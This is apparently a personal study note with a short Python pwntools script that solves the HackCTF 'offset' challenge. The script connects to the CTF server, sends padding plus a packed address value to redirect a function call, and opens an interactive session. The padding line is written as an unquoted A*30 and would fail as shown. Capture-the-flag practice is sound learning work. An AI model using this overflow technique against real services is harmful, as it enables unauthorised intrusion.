# 개인공부
## python

## hackctf. offset

from pwn import *

p = remote("ctf.j0n9hyun.xyz",3007)

p.recvuntil("Which function would you like to call?")

pay = A*30
pay += p32(0xD8)

p.sendline(pay)
p.interactive()
